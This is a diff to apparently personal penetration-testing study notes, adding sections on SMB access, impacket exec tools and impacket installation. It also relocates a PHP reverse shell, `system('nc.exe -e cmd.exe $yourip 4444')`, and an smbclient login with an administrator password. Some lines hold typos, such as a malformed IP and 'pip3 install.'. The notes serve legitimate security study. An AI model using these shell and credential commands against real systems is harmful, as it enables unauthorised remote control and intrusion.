@@ -283,6 +283,39 @@ netsh firewall show config
   - Mimikatz, LinPEAS, BloodHound
 - Reporting Tools
   - Dradis Framework
+### Exploiting SMB
+```
+smbclient -U 'administrator%u6!4zwgwOM#^0Bf#Nwhn' \\\\127..0.1\\c$
+```
+
+### Exploiting PHP
+This is a basic reverse shell written in php 
+```
+<?php
+system('nc.exe -e cmd.exe $yourip 4444')
+?>
+```
+### Exploiting with exec tools
+- psexpec.py
+- smbexec.py
+- wmiexec.py
+
+### Exploiting with Shells
+Spawning a TTY Shell - https://netsec.ws/?p=337
+
+### impacket
+https://github.com/SecureAuthCorp/impacket.git
+```
+cd /opt/
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket-0.9.19/
+pip3 install.
+```
+> [!NOTE]
+> The version number may change under the git clone line
+
+
+
 ### netcat and nmap
 [Kioptrix Download](https://tcm-sec.com/kioptrix)
 
@@ -298,13 +331,7 @@ SYN SYNACK RST nmap -sS
 ```
 nmap -T4 -P- -A
 ```
-### Exploiting PHP
-This is a basic reverse shell written in php 
-```
-<?php
-system('nc.exe -e cmd.exe $yourip 4444')
-?>
-```
+
 ### Recon Resources | Google Fu
 * Google, lmgtfy,
 * site:<domain>
